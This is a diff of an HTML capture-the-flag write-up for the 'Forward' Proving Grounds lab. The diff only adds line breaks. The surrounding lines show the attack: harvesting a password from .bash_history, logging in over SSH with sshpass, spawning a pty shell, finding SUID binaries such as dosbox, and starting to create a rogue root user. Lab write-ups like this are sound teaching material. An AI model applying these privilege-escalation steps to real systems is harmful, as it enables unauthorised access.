@@ -209,6 +209,8 @@ putting file .forward as \.forward (0.3 kb/s) (average 0.3 kb/s)
 
     <li>After looking in each user's home directory I find a .bash_history file that contains credentials.</li>
 
+    <br>
+    
     <pre>
 fox@forward:/home/mara$ cat .bash_history 
 sshh mara@192.168.0.191
@@ -218,12 +220,16 @@ ssh mara@192.168.0.191
 
     <li>I tried SSHing as mara using this password but it does not work.  So I try it against all the users.  It turns out to be the password for fox.</li>
 
+    <br>
+
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/ProvingGrounds/Forward]&#13;&#10;&boxur;&HorizontalLine;$ sshpass -p CIARLARIELLOkj99 ssh fox@192.168.90.157                                                                                                  130 &Cross;&#13;&#10;Linux forward 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64&#13;&#10;&#13;&#10;The programs included with the Debian GNU/Linux system are free software;&#13;&#10;the exact distribution terms for each program are described in the&#13;&#10;individual files in /usr/share/doc/*/copyright.&#13;&#10;&#13;&#10;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&#13;&#10;permitted by applicable law.&#13;&#10;$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;fox@forward:~$ 
     </pre>
     
 
     <li>I check for SUID programs and something interesting turns up.</li>
+
+    <br>
 
     <pre>
 fox@forward:~$ find / -perm -u=s -ls 2&gt;/dev/null&#13;&#10;   273373     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper&#13;&#10;   276719    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign&#13;&#10;   398815     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device&#13;&#10;   281843   1156 -rwsr-xr-x   1 root     root        1181384 May 13  2020 /usr/sbin/exim4&#13;&#10;   266035     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount&#13;&#10;   262183     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd&#13;&#10;   265710     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su&#13;&#10;   282188     92 -rwsr-sr-x   1 root     mail          93392 Nov 16  2017 /usr/bin/procmail&#13;&#10;   272440     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount&#13;&#10;   266037     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount&#13;&#10;   262179     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn&#13;&#10;   283136   2612 -rwsr-sr-x   1 root     root        2671432 Jul  8  2019 /usr/bin/dosbox&#13;&#10;   262180     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh&#13;&#10;   265563     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp&#13;&#10;   269340    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo&#13;&#10;   262182     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
@@ -239,6 +245,8 @@ fox@forward:~$ find / -perm -u=s -ls 2&gt;/dev/null&#13;&#10;   273373     52 -r
     <br>
 
     <li>Before launching dosbox we need to create a file with the new root user we will be creating.</li>
+
+    <br>
 
     <pre>
 fox@forward:/tmp$ cat rootx 
